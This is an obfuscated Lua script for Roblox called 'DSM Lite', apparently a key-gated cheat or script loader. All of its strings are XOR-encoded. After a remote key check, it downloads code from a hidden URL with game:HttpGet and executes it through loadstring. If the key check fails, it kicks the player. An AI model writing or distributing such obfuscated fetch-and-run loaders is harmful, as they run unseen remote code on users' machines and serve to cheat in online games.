--[[

██████  ███████ ███    ███     ██      ██ ████████ ███████ 
██   ██ ██      ████  ████     ██      ██    ██    ██      
██   ██ ███████ ██ ████ ██     ██      ██    ██    █████   
██   ██      ██ ██  ██  ██     ██      ██    ██    ██      
██████  ███████ ██      ██     ███████ ██    ██    ███████ 
                                                    
             DSM Lite. Made By Payson Holmes
]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor or v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v10,v11)local v12={};for v14=1014 -(173 + 840), #v10 do v6(v12,v0(v4(v1(v2(v10,v14,v14 + (1075 -(799 + (1014 -(315 + 424)))))),v1(v2(v11,((617 -368) -(221 + (107 -80))) + ((v14-(1 + 0 + (0 -0)))% #v11),1 + 0 + ((v14-((786 + 754) -((2279 -1327) + 587)))% #v11) + ((2574 -(1111 + 32)) -(876 + (1393 -839))))))%(109 + 89 + 58)));end return v5(v12);end local v8=_G.Key;local v9=v7("\60\209\255\128\246\61\60\64\58\134\241\134\228\104","\95\185\154\227\157\85\89\50")   .. v8;if (game:HttpGet(v9)==v7("\157\122\243\189\175\126\243\186\190\119\254","\202\18\154\201")) then local v13=0;while true do if (v13==0) then local v15=(3512 -(73 + 1801)) -((3106 -(1153 + 841)) + (1322 -796));while true do if (v15==(0 -0)) then local v16=0;while true do if (v16==0) then loadstring(game:HttpGet(v7("\249\35\201\36\226\109\146\123\225\51\216\58\255\46\147\44\232\45\146\16\194\26\146\24\248\35\216\123\253\56\220\48\244\37\147\56\228\54","\145\87\189\84")))();print(v7("\147\27\123\231\145\164\192\174\142\27\102\241\222\136\153\198\177\22\114\231\194","\222\122\31\130\177\230\185\142"));v16=1;end if (v16==1) then v15=1 + 0 + 0;break;end end end if ((1 + 0 + (0 -0))==v15) then v13=1;break;end end end if (v13==(1 + 0)) then game.StarterGui:SetCore(v7("\213\191\122\177\136\233\174\125\179\175\229\187\96\188\169\232","\134\218\20\213\198"),{[v7("\215\210\217\220\230","\131\187\173\176")]=v7("\89\41\118\243\156\176\105\31","\29\122\59\211\208\217"),[v7("\134\91\27\29","\210\62\99\105\155\96\79\117")]=v7("\100\117\13\211\168\103\242\9\68\8\207\251\74\229\9\92\6\218\229\64\248","\41\20\105\182\136\37\139"),[v7("\27\206\195\160","\82\173\172\206\117")]=v7("","\103\61\21\57\185"),[v7("\8\208\188\94\145\119\35\203","\76\165\206\63\229\30")]=(4 -3) + (11 -4)});break;end end else game.Players.LocalPlayer:Kick(v7("\208\60\61\207\227\195\191\185\25\46\215\174\138\139\245\55\42\221\234\138\169\252\56\36\199\225\138\186\247\54\107\218\253\211\251\248\53\42\199\225\132","\153\82\75\174\143\170\219"));end